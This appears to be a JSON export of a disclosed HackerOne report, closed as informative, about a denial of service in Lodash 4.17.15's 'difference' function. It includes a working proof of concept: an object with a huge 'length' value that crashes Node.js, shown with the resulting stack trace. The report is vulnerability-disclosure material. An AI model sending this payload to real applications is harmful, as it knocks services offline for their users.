@@ -1,0 +1,129 @@
+{
+  "id": 670779,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NzA3Nzk=",
+  "url": "https://hackerone.com/reports/670779",
+  "title": "Lodash \"difference\" (possibly others) Function Denial of Service Through Unvalidated Input",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "critical",
+  "readable_substate": "Informative",
+  "created_at": "2019-08-09T23:22:49.175Z",
+  "submitted_at": "2019-08-09T23:22:49.175Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "spengietz",
+    "url": "/spengietz",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-12-04T19:49:06.258Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-12-04T19:48:56.407Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\nI would like to report a denial of service in Lodash.\nIt allows excessive usage of the NodeJS process's memory, leading to a \"JavaScript heap out of memory\" crash. The same vulnerability exists in the browser version of Lodash and causes Firefox's tab to crash and restart and causes Chrome's tab to completely freeze and become uncloseable (from my testing at least).\n\n# Module\n\n**module name:** Lodash\n**version:** Only tested in 4.17.15\n**npm page:** `https://www.npmjs.com/package/lodash`\n\n## Module Description\n\n> Copy description from npm page\n\nA modern JavaScript utility library delivering modularity, performance & extras.\nThe Lodash library exported as Node.js modules.\n\n## Module Stats\n\n> Replace stats below with numbers from npm’s module page:\n\n24,853,923 downloads in the last week\nI can't find where it lists the daily/monthly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\n> Description about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.\n\nThe vulnerability was discovered while pentesting a web application for a client. The Lodash \"difference\" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947) uses the \"baseDifference\" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764) to perform what it needs to. \"difference\" is supposed to accept two arrays (`_.difference(array, [values])`) but it does not actually verify whether it is dealing with valid arrays before processing the data. This means a custom malicious Object can be supplied and the function will think it is an array, allowing excessive memory consumption that ends up in a crash of the Node.js process (or crash/freeze of the browser tab in Firefox/Chrome).\n\nIt was found to be exploitable in the clients application because they were passing user-supplied data into the \"difference\" function, which allowed me to crash their application with this vulnerability.\n\n## Steps To Reproduce:\n\n> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\n\nBenign example:\n```\nconst _ = require('lodash')\n\nuser_supplied_array = [1, 2, 3]\nvalues_to_compare_to = {'length': 5} // An object with the \"length\" property defined to an integer will be accepted as an array by the _.difference function\n\n_.difference(values_to_compare_to, user_supplied_array) // This will output a new array of length 5 where each value is \"undefined\"\n```\n\nBecause Lodash is essentially creating a new array of the length that we specify in \"values_to_compare_to\", we can provide a large value that will cause the Node.js process to crash before it can successfully create the array.\n\nWill crash Node.js example:\n```\nconst _ = require('lodash')\n\nuser_supplied_array = [1, 2, 3]\nvalues_to_compare_to = {'length': 99999999999} // This could be any huge value\n\n_.difference(values_to_compare_to, user_supplied_array) // The Node.js process will crash, saying that the JavaScript heap ran out of memory\n```\n\nWhen the Node.js process crashes, a stack trace similar to the following is output:\n```\n[5515:0x55aa82652700]    41959 ms: Mark-sweep 580.0 (585.7) -> 580.0 (585.7) MB, 201.8 / 0.0 ms  allocation failure GC in old space requested\n[5515:0x55aa82652700]    42169 ms: Mark-sweep 580.0 (585.7) -> 579.9 (584.2) MB, 209.7 / 0.0 ms  last resort GC in old space requested\n[5515:0x55aa82652700]    42372 ms: Mark-sweep 579.9 (584.2) -> 579.9 (584.2) MB, 203.2 / 0.0 ms  last resort GC in old space requested\n\n\n<--- JS stacktrace --->\n\n==== JS stack trace =========================================\n\nSecurity context: 0x2eaefaca5729 <JSObject>\n    1: baseDifference [/root/temp/tmp/node_modules/lodash/lodash.js:~2764] [pc=0x11aea9f0d272](this=0x28b6ba70c0f9 <JSGlobal Object>,array=0x3dd3a43ca4c9 <Object map = 0x1294fe65a571>,values=0x3dd3a43ca4a9 <JSArray[2]>,iteratee=0x3dd3a43822d1 <undefined>,comparator=0x3dd3a43822d1 <undefined>)\n    2: arguments adaptor frame: 2->4\n    3: /* anonymous */ [/root/temp/tmp/node_modules/lodash/lodash.j...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: node::Abort() [node]\n 2: 0x55aa808c347e [node]\n 3: v8::Utils::ReportOOMFailure(char const*, bool) [node]\n 4: v8::internal::V8::FatalProcessOutOfMemory(char const*, bool) [node]\n 5: v8::internal::Factory::NewUninitializedFixedArray(int) [node]\n 6: 0x55aa80448b1d [node]\n 7: v8::internal::Runtime_GrowArrayElements(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 8: 0x11aea9d842fd\nAborted\n```\n\n\n## Patch\n\n> If you're able to provide a patch with the fix please post it in this section\n\nI don't know specifically, but it seems that proper verification that both inputs are arrays would fix this.\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\nTested on two separate operating systems with the same end results.\nWindows:\n- Windows 10\n- Node.js v8.9.4\n- npm version 5.6.0\n- Firefox 68.01 and Chrome 76.0.3809.100 when testing the browser version of Lodash\n\nLinux:\n- Kali Linux\n- Node.js v9.0.0\n- npm version 6.1.0\n- Did not test in Firefox/Chrome on this operating system\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: N, it said to report it here\n- I opened an issue in the related repository: N, it said not to publicly disclose it until after\n\n## Impact\n\nAn attacker could cause excessive resource consumption which could slow down the server for other users or they could cause an outright crash of the Node.js process, denying service to all users of the application.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 6,
+  "voters": [
+    "macasun",
+    "eveeez",
+    "0x08",
+    "pewpewpew-soul",
+    "yoflow",
+    "cykich"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5914,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "lodash",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
